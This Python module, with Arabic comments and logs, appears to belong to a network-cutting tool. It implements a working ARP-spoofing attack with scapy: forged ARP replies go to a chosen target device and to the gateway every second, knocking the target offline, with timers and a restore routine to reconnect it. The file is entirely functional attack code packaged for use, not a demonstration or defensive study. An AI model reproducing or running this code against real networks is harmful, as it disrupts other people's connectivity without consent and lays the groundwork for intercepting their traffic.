"""
محرك قطع الاتصال عبر ARP Spoofing باستخدام scapy
"""
import threading
import time
from utils.logger import log

try:
    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    log.warning("scapy غير مثبت - قطع الاتصال لن يعمل")


class Disconnector:
    def __init__(self):
        self._active_attacks = {}  # {ip: {"thread": thread, "running": bool, "timer": timer}}

    def is_available(self):
        return HAS_SCAPY

    def disconnect(self, target_ip, target_mac, gateway_ip, duration=-1, on_status=None):
        """قطع الاتصال عن جهاز محدد"""
        if not HAS_SCAPY:
            log.error("scapy غير متوفر")
            return False
        if target_ip in self._active_attacks:
            log.warning(f"الجهاز {target_ip} مقطوع بالفعل")
            return False
        # التحقق من صحة MAC - إذا لم يكن MAC حقيقياً نحاول الحصول عليه
        if not target_mac or "N/A" in target_mac or len(target_mac) < 17:
            try:
                target_mac = getmacbyip(target_ip)
            except Exception:
                target_mac = None
            if not target_mac:
                log.error(f"لا يمكن الحصول على MAC لـ {target_ip}")
                return False

        log.info(f"بدء قطع الاتصال عن {target_ip} ({target_mac}) - المدة: {duration}s")

        attack_info = {"running": True, "thread": None, "timer": None}

        def _spoof():
            try:
                # إنشاء حزم ARP مزيفة
                # خداع الهدف بأننا الراوتر
                pkt_to_target = Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip
                )
                # خداع الراوتر بأننا الهدف
                gateway_mac = getmacbyip(gateway_ip)
                if not gateway_mac:
                    log.error("لم يتم العثور على MAC الراوتر")
                    return

                pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip
                )

                if on_status:
                    on_status(target_ip, "disconnected")

                while attack_info["running"]:
                    sendp(pkt_to_target, verbose=False)
                    sendp(pkt_to_gateway, verbose=False)
                    time.sleep(1)

                # إعادة الاتصال - إرسال الحزم الصحيحة
                self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                if on_status:
                    on_status(target_ip, "online")

            except Exception as e:
                log.error(f"خطأ في قطع الاتصال عن {target_ip}: {e}")
                if on_status:
                    on_status(target_ip, "error")

        thread = threading.Thread(target=_spoof, daemon=True)
        attack_info["thread"] = thread

        # مؤقت الإيقاف التلقائي
        if duration > 0:
            timer = threading.Timer(duration, lambda: self.reconnect(target_ip))
            attack_info["timer"] = timer
            timer.start()

        self._active_attacks[target_ip] = attack_info
        thread.start()
        return True

    def reconnect(self, target_ip):
        """إعادة الاتصال لجهاز محدد"""
        if target_ip not in self._active_attacks:
            return False
        attack = self._active_attacks[target_ip]
        attack["running"] = False
        if attack["timer"]:
            attack["timer"].cancel()
        # انتظار انتهاء الـ thread
        if attack["thread"] and attack["thread"].is_alive():
            attack["thread"].join(timeout=5)
        del self._active_attacks[target_ip]
        log.info(f"تم إعادة الاتصال لـ {target_ip}")
        return True

    def reconnect_all(self):
        """إعادة الاتصال لجميع الأجهزة"""
        ips = list(self._active_attacks.keys())
        for ip in ips:
            self.reconnect(ip)
        log.info("تم إعادة الاتصال لجميع الأجهزة")

    def is_disconnected(self, ip):
        return ip in self._active_attacks

    def get_disconnected_list(self):
        return list(self._active_attacks.keys())

    def _restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """إرسال حزم ARP صحيحة لإعادة الاتصال"""
        try:
            pkt_to_target = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac
            )
            pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac
            )
            for _ in range(5):
                sendp(pkt_to_target, verbose=False)
                sendp(pkt_to_gateway, verbose=False)
                time.sleep(0.3)
            log.info(f"تم استعادة ARP لـ {target_ip}")
        except Exception as e:
            log.error(f"فشل استعادة ARP لـ {target_ip}: {e}")

    def cleanup(self):
        """تنظيف عند إغلاق التطبيق"""
        self.reconnect_all()
